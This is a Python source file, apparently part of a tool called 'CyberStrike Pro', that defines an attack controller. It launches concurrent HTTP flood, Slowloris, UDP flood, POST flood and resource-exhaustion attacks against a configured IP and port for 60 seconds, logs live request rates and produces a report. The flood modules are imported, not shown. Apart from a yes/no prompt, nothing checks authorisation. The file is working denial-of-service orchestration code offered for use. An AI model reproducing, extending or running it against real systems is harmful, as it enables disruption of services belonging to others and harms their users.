"""
Main attack controller for CyberStrike Pro
"""

import time
import threading
from attacks.http_flood import HTTPFlood
from attacks.slowloris import SlowlorisAttack
from attacks.udp_flood import UDPFlood
from attacks.post_flood import POSTFlood
from attacks.resource_exhaustion import ResourceExhaustion
from .stats_manager import StatsManager
from .report_generator import ReportGenerator
from utils.logger import log

class AttackController:
    def __init__(self, config_manager, logger):
        self.config_manager = config_manager
        self.logger = logger
        self.stats_manager = StatsManager()
        self.report_generator = ReportGenerator()
        self.attack_threads = []
        self.is_running = False
        
        # Initialize attacks
        target_config = config_manager.get_target()
        self.attacks = {
            'http_flood': HTTPFlood(target_config, config_manager, self.stats_manager),
            'slowloris': SlowlorisAttack(target_config, config_manager, self.stats_manager),
            'udp_flood': UDPFlood(target_config, config_manager, self.stats_manager),
            'post_flood': POSTFlood(target_config, config_manager, self.stats_manager),
            'resource_exhaustion': ResourceExhaustion(target_config, config_manager, self.stats_manager)
        }
    
    def run(self):
        """Main execution loop"""
        target = self.config_manager.get_target()
        
        # Display target info and get confirmation
        if not self.confirm_attack(target):
            return
        
        log("💀 LAUNCHING ULTRA-AGGRESSIVE MULTI-VECTOR ATTACK...", "ATTACK")
        
        # Start attacks
        self.start_attacks()
        
        # Monitor and control
        self.monitor_attacks()
        
        # Generate final report
        self.generate_report()
    
    def confirm_attack(self, target):
        """Confirm attack with user"""
        print(f"\n⚡ ATTACK CONFIRMATION")
        print("=" * 50)
        print(f"🎯 Target: http://{target['ip']}:{target['port']}{target['uri']}")
        print(f"💀 This will generate EXTREME traffic levels")
        print(f"⏱️  Duration: 60 seconds")
        print(f"🌪️  Attacks: HTTP Flood, Slowloris, UDP Flood, POST Flood")
        
        confirmation = input("\n❓ Start the attack? (yes/no): ").lower()
        if confirmation != "yes":
            log("Attack canceled by user.", "INFO")
            return False
        return True
    
    def start_attacks(self):
        """Start all enabled attacks"""
        self.is_running = True
        self.stats_manager.start_timer()
        
        # Start status monitor
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        self.attack_threads.append(stats_thread)
        
        # Start individual attacks
        for attack_name, attack in self.attacks.items():
            if self.config_manager.is_attack_enabled(attack_name):
                attack.start()
                log(f"✅ Started {attack_name}", "CONTROLLER")
    
    def _stats_monitor(self):
        """Monitor and display statistics"""
        config = self.config_manager.config
        interval = config["logging"]["live_stats_interval"]
        
        while self.is_running:
            time.sleep(interval)
            stats = self.stats_manager.get_stats()
            
            http_rps = stats.http_requests / max(stats.attack_duration, 1)
            post_rps = stats.post_requests / max(stats.attack_duration, 1)
            udp_rps = stats.udp_packets / max(stats.attack_duration, 1)
            total_rps = http_rps + post_rps + udp_rps
            
            log(f"📊 LIVE: HTTP={int(http_rps)}/s | POST={int(post_rps)}/s | UDP={int(udp_rps)}/s | Slowloris={stats.slowloris_connections} | Total={int(total_rps)}/s", "STATUS")
    
    def monitor_attacks(self):
        """Monitor attack duration and handle user input"""
        try:
            log("⏰ Attack will run for 60 seconds...", "TIMER")
            time.sleep(60)
            
            self.stop_attacks()
            log("🛑 ULTRA-AGGRESSIVE attack STOPPED after 60 seconds", "STOP")
            
        except KeyboardInterrupt:
            self.stop_attacks()
            log("🛑 Attack STOPPED by user", "STOP")
    
    def stop_attacks(self):
        """Stop all running attacks"""
        self.is_running = False
        
        for attack in self.attacks.values():
            attack.stop()
        
        # Wait a bit for threads to finish
        time.sleep(2)
    
    def generate_report(self):
        """Generate final attack report"""
        self.report_generator.generate(
            self.stats_manager.get_stats(),
            self.config_manager.get_target()
        )
